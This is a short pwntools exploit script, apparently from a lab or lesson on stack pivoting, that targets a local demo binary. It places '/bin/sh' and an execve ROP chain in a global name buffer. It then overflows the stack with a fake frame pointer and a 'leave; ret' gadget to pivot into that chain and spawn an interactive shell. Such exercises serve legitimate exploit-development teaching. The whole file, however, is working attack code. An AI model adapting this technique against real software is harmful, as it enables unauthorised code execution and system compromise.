from pwn import *


context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

p = process('./demo_stack_pivoting')

name = 0x4c3300 # address of name
leave_ret = 0x401dd0 # leave; ret
pop_rdi_ret = 0x40186a # pop rdi; ret
pop_rsi_ret = 0x40f40e # pop rsi; ret
pop_rax_ret = 0x4516c7 # pop rax; ret
pop_rdx_ret = 0x40176f # pop rdx; ret
syscall = 0x4012d3 # syscall

ROP = b'/bin/sh\x00'
ROP += flat(
    pop_rdi_ret, name,
    pop_rsi_ret, 0,
    pop_rdx_ret, 0,
    pop_rax_ret, 0x3b,
    syscall
)

p.sendafter('Give me your name: ', ROP)

gdb.attach(p)
p.sendafter('Give me your ROP: ', b'a'*0x10 + p64(name) + p64(leave_ret))

p.interactive()
